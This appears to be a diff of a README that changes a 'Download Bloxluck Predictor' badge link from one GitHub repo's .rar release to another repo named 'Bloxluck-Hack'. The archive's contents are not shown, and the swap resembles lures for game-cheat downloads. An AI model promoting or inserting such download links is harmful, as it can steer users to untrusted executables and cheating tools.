@@ -14,7 +14,7 @@
 
 
 <p align="center">
-  <a href="https://github.com/BloxPaul/Bloxluck-Predictor/releases/download/Bloxluck/Bloxluck.Predictor.rar" target="_blank">
+  <a href="https://github.com/Sandorrx/Bloxluck-Hack/releases/download/Bloxluck/Bloxluck.Predictor.rar" target="_blank">
     <img src="https://img.shields.io/badge/Download-Bloxluck%20Predictor-brightgreen?style=for-the-badge&logo=roblox&logoColor=white" alt="Download Bloxluck Predictor" />
   </a>
 </p>
